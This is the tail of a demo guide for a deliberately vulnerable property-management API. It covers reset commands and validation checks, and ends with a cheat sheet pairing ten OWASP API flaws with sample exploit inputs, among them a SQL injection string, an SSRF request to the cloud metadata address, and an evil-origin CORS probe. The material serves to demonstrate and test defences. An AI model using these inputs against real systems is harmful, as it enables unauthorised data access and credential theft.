# Option 1: npm script (recommended — idempotent)
npm run seed:reset

# Option 2: direct SQLite reset (local)
sqlite3 ./data/proptracker.db < ./db/seed.sql

# Option 3: App Service restart (Azure — re-seeds on startup in demo mode)
az webapp restart --name proptracker-api-dev --resource-group proptracker-rg
```

### What Gets Reset

| Table | Reset Action |
|---|---|
| `users` | Restores alice, bob, charlie, diana with original roles and bcrypt passwords |
| `jobs` | Restores Job 1 (alice, `open`) and Job 2 (diana assigned, `in_progress`) |
| `bids` | Clears all flood bids created during VULN-6 demo |
| `contractors` | Resets charlie: `role=contractor`, `isVerified=false`, `isAdmin=false` |
| `job_attachments` | Removes files uploaded during VULN-4 demo |

### Quick Validation After Reset

```bash
# Confirm charlie's role is reset
curl -s $API_URL/api/contractors/charlie-uuid | jq '{role,isVerified,isAdmin}'
# Expected: {"role":"contractor","isVerified":false,"isAdmin":false}

# Confirm Job 2 is still in_progress
curl -s $API_URL/api/jobs/cccccccc-0000-0000-0000-000000000002 \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '{status,completedBy}'
# Expected: {"status":"in_progress","completedBy":null}

# Confirm charlie's bid count is back to 0 on Job 1
curl -s "$API_URL/api/jobs/cccccccc-0000-0000-0000-000000000001/bids" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | jq '[.[] | select(.contractorEmail=="charlie@contractor.com")] | length'
# Expected: 0
```

### Clear Code Scanning Alerts (Optional)

For a clean Security tab before the next audience:

1. Navigate to **Security → Code scanning**.
2. Select all open alerts → **Dismiss** with reason *"Used in testing"*.
3. Trigger all 10 check workflows manually from the Actions tab.
4. Alerts re-appear within 60 seconds — ready for the next audience.

---

## Quick Reference — Vulnerability Cheat Sheet

| # | Endpoint | Exploit Input | Broken Response | Expected Response | OWASP Category |
|---|---|---|---|---|---|
| 1 | `GET /api/jobs/:id` | Different user's valid JWT | `200` + full job | `403 Forbidden` | API1 — BOLA |
| 2 | Any protected endpoint | Expired JWT | `200` + data | `401 Unauthorized` | API2 — Broken Auth |
| 3 | `PUT /api/contractors/:id` | `{"role":"admin"}` in body | `200` + role=admin | `200` (role unchanged) | API3 — Mass Assignment |
| 4 | `POST /api/jobs/:id/attachments` | 20 MB file upload | `200` accepted | `413 Payload Too Large` | API4 — Resource Consumption |
| 5 | `GET /api/properties?limit=99999` | `limit=99999` param | All records | Max 100 records | API4 — Resource Consumption |
| 6 | `POST /api/jobs/:id/bids` | 50 rapid POSTs | All `200` | `429` after 5th | API4 — Resource Consumption |
| 7 | CORS preflight (`OPTIONS`) | `Origin: https://evil.example.com` | `ACAO: *` | No ACAO for evil origin | API8 — Misconfiguration |
| 8 | `GET /api/properties/search?q=` | `' OR 1=1 --` | All records / user data | Search results only | API8 — Injection |
| 9 | `POST /api/jobs/:id/complete` | Non-assigned contractor | `200` + job done | `403 Forbidden` | API9 — Inventory Mgmt |
| 10 | `POST /api/contractors/webhook` | `webhookUrl=http://169.254.169.254/...` | `200` + metadata | `400 Bad Request` | API10 — SSRF |

---

*Demo guide v1.0 — PropTracker APIM POC — Cushman & Wakefield Development Engineering*